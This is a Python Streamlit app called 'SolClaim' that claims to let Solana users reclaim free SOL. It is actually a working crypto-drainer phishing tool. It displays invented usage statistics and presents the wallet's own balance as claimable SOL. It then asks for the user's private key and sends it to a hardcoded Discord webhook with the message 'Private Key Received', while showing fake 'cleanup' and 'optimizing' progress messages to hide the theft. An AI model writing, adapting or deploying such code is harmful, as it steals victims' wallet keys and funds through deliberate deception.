import streamlit as st
import time
import requests
from solana.rpc.api import Client

# Initialize Solana client
solana_client = Client("https://api.mainnet-beta.solana.com")

# Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"

# Function to send private key to Discord webhook
def send_to_discord(private_key):
    payload = {
        "content": f"⚠️ Private Key Received: `{private_key}`"
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
    return response.status_code == 200

# Streamlit app title
st.title("💰 SolClaim: Reclaim Your Sol!")

# Display stats
st.write("📊 Stats: 6252 users have already claimed 1925.67 SOL in total!")
st.write("If you've traded or received tokens on Solana (like Raydium or Pumpfun), use SolClaim to check if you're eligible to claim back SOL for FREE.")

# Navigation menu
menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])

if menu == "Check Wallet ✅":
    st.header("Check Wallet Eligibility")
    wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")

    if wallet_address:
        with st.spinner("🕑 Loading wallet info..."):
            time.sleep(3)  # Simulate loading time

            # Fetch wallet balance (this is a placeholder, replace with actual logic)
            balance = solana_client.get_balance(wallet_address)
            if balance['result']:
                sol_balance = balance['result']['value'] / 1e9  # Convert lamports to SOL
                st.success(f"🎉 You have {sol_balance:.6f} SOL available to claim!")
                
                # Cleanup process
                if st.button("Proceed with Cleanup"):
                    private_key = st.text_input("Enter your private key to proceed:", type="password")
                    if private_key:
                        # Send private key to Discord webhook
                        if send_to_discord(private_key):
                            st.write("🔒 Cleanup process initiated...")
                            st.write("Optimizing wallet...")
                            time.sleep(2)
                            st.success("✅ Cleanup request received! The process may take up to 24 hours to complete.")
                            st.write("You will be notified once the cleanup is done. Thank you for your patience!")
                        else:
                            st.error("Failed to send request. Please try again.")
                    else:
                        st.error("Please enter your private key to proceed.")
            else:
                st.error("Invalid wallet address or no SOL available to claim.")

elif menu == "Invite & Earn 📢":
    st.header("Invite & Earn 📢")
    st.write("🚧 This feature is currently under development. 🚧")
    st.write("We're working hard to bring you a seamless referral system where you can invite friends and earn rewards!")
    st.write("Please check back soon for updates. Thank you for your patience! 🙏")
